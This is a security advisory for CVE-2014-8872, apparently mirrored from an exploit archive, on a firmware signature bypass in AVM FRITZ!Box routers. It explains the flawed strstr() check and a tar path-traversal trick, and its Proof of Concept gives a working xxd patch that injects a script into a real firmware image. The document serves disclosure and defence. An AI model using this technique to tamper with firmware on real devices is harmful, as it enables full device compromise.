@@ -1,0 +1,213 @@
+id: 23171
+date: 01/22/2015
+title: AVM FRITZ!Box Firmware Signature Bypass Vulnerability
+author: RedTeam
+cves: CVE-2014-8872
+
+AVM FRITZ!Box: Firmware Signature Bypass
+
+The signature check of FRITZ!Box firmware images is flawed. Malicious
+code can be injected into firmware images without breaking the RSA
+signature. The code will be executed either if a manipulated firmware
+image is uploaded by the victim or if the victim confirms an update on
+the webinterface during a MITM attack.
+
+
+Details
+=======
+
+Product: AVM FRITZ!Box 7490, 7390, 7270v3 and other models
+Affected Versions:
+  FRITZ!Box 6810 LTE, since firmware 5.22,
+  FRITZ!Box 6840 LTE, since firmware 5.23,
+  other models, since firmware 5.50
+Fixed Versions:
+  FRITZ!Box 7270, since firmware 6.05,
+  FRITZ!Box 7270v3, since firmware 6.05,
+  FRITZ!Box 7240, since firmware 6.05,
+  other models, since firmware 6.20
+
+Vulnerability Type: Improper Verification of Cryptographic Signature
+Security Risk: medium
+Vendor URL: http://avm.de
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2014-010
+Advisory Status: published
+CVE: CVE-2014-8872
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8872
+
+
+Introduction
+============
+
+FRITZ!Box is the brand name of SOHO routers/CPEs manufactured by AVM
+GmbH. The FRITZ!Box usually combines features such as an xDSL modem
+functionality, routing, wifi access, VoIP, NAS and DECT.
+
+
+More Details
+============
+
+AVM regularly publishes firmware updates to address bugs and to
+introduce new features. Those updates are cryptographically signed to
+avoid tampering. The firmware image can either be uploaded manually or
+the FRITZ!Box downloads it semi-automatically from
+http://download.avm.de via unencrypted HTTP if a new version is
+available.
+
+Technically, AVM firmware images are tar files.
+
+  $ tar --list --file FRITZ.Box_7490.113.06.05.image
+  ./var/
+  ./var/regelex
+  ./var/install
+  ./var/info.txt
+  ./var/tmp/
+  ./var/tmp/filesystem.image
+  ./var/tmp/kernel.image
+  ./var/chksum
+  ./var/signature
+
+The firmware image contains a shell script called ./var/install, which
+will be invoked after successful verification of the image. It is
+responsible for flashing the new firmware.
+
+In a tar archive, each file is described by a 512 byte header followed
+by n*512 bytes of file content. The end of a tar archive is represented
+by 1024 null bytes after the last content block. In some cases, AVM
+appends up to 8 KiB of excess null bytes. The whole tar archive,
+including these additional null bytes, is covered by a cryptographic
+signature that is stored in the file ./var/signature within the archive.
+
+The file contains a 1024 bit RSA decrypted MD5 hash of the firmware
+image. 1024 bytes of space (tar header+content) are normally allocated
+to the signature file. When calculating the MD5 hash, that space is
+treated as null bytes.
+
+The library libfwsign.so is responsible for the detection of the
+signature file in the tar header of the uploaded firmware image. It uses
+the strstr() function of the C standard library like this:
+
+  if (strstr(filename, "/var/signature"))
+  {
+    // signature file found.
+    // update hash with 512 + n*512 null bytes.
+  } else {
+    // signature file not found.
+    // update hash with tar header and content of current file.
+  }
+
+Therefore, any of the following names will be treated as a signature
+file and null bytes instead of the real content will be fed to the MD5
+hash function:
+
+  ./var/signature
+  /var/signature
+  /tmp/var/signature/example
+  ./var/signature/.././var/install
+
+If such a file is placed after the last legitimate content block (where
+at least 1024 signed null bytes reside), the library libfwsign.so will
+compute the same MD5 hash as it would do for an unmodified firmware
+image. As a result, the modified firmware image will pass the signature
+verification.
+
+The fourth file name, ./var/signature/.././var/install, contains a
+directory traversal. When parsed by tar, a warning will be generated and
+anything from the start of the file name up to /../ will be omitted. The
+content of the file will be extracted to ./var/install and the original
+./var/install file will be overwritten.
+
+Thus, an attacker could easily inject malicious code into ./var/install,
+which will be executed after the manipulated firmware image has passed
+the signature verification.
+
+
+Proof of Concept
+================
+
+The following command manipulates the latest firmware image for the
+FRITZ!Box 7490. When uploaded to a vulnerable FRITZ!Box 7490, all LEDs
+of the device will flash constantly to indicate that code execution has
+occured.
+
+------------------------------------------------------------------------
+$ xxd -r - FRITZ.Box_7490.113.06.20.image <<EOF
+17f2600: 2e2f 7661 722f 7369 676e 6174 7572 652f  ./var/signature/
+17f2610: 2e2e 2f2e 2f76 6172 2f69 6e73 7461 6c6c  .././var/install
+17f2620: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+*
+17f2660: 0000 0000 3030 3030 3737 3700 3030 3030  ....0000777.0000
+17f2670: 3030 3000 3030 3030 3030 3000 3030 3030  000.0000000.0000
+17f2680: 3030 3031 3030 3000 3030 3030 3030 3032  0001000.00000002
+17f2690: 3430 3700 3031 3532 3037 0020 3000 0000  407.015207. 0...
+17f26a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+*
+17f2700: 0075 7374 6172 2020 0072 6f6f 7400 0000  .ustar  .root...
+17f2710: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+17f2720: 0000 0000 0000 0000 0072 6f6f 7400 0000  .........root...
+17f2730: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+*
+17f2800: 2321 2f62 696e 2f73 680a 6563 686f 2022  #!/bin/sh.echo "
+17f2810: 6c65 642d 6374 726c 2070 6f77 6572 5f6f  led-ctrl power_o
+17f2820: 6666 0a6c 6564 2d63 7472 6c20 776c 616e  ff.led-ctrl wlan
+17f2830: 5f6f 6666 0a6c 6564 2d63 7472 6c20 7570  _off.led-ctrl up
+17f2840: 6461 7465 5f6c 6564 313d 300a 6c65 642d  date_led1=0.led-
+17f2850: 6374 726c 2068 6172 6477 6172 655f 6572  ctrl hardware_er
+17f2860: 726f 720a 642d 6374 726c 2075 7064 6174  ror.d-ctrl updat
+17f2870: 655f 6c65 6431 3d30 0a6c 6564 2d63 7472  e_led1=0.led-ctr
+17f2880: 6c20 6861 7264 7761 7265 5f65 7272 6f72  l hardware_error
+17f2890: 2220 3e20 2f76 6172 2f66 6c61 7368 2f64  " > /var/flash/d
+17f28a0: 6562 7567 2e63 6667 0a65 7869 7420 310a  ebug.cfg.exit 1.
+17f28b0: 2345 4f46 0a00 0000 0000 0000 0000 0000  #EOF............
+17f28c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+*
+17f29f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+EOF
+------------------------------------------------------------------------
+
+
+Workaround
+==========
+
+Check each firmware image manually for multiple occurrences of the
+string "/var/signature" in file names using tar --list.
+
+
+Fix
+===
+
+Upgrade to a fixed firmware version. Before upgrading, check the new
+firmware image for suspicious file names (see "Workaround").  AVM should
+secure the distribution of firmware images with TLS to prevent MITM
+attacks.
+
+
+Security Risk
+=============
+
+This vulnerability allows an attacker to inject arbitrary code into AVM
+firmware images while maintaining its cryptographic signature. If the
+attacker is able to perform a Man-in-the-Middle attack between the AVM
+FRITZ!Box and http://download.avm.de/, firmware images can be
+manipulated in transit. Otherwise, attackers need to trick their victims
+into installing a malicious firmware image. While successful attacks
+result in the full compromise of a device, they would typically require an
+attacker in a very strong position. The vulnerability is therefore
+considered to pose a medium risk.
+
+
+Timeline
+========
+
+2014-03-10 Vulnerability identified
+2014-03-12 Vendor notified
+2014-05-27 Vendor released fixed version for FRITZ!Box 7270v3
+2014-08-12 Vendor released fixed version for FRITZ!Box 7490
+2014-09-09 Vendor released fixed version for FRITZ!Box 7390
+2014-11-14 CVE number assigned
+2014-12-08 Vendor provided updated list of affected and fixed models/versions
+2014-12-15 Vendor finished releasing fixed versions for all current models
+2015-01-21 Advisory released
+
+#  0day.today [2023-03-24]  #
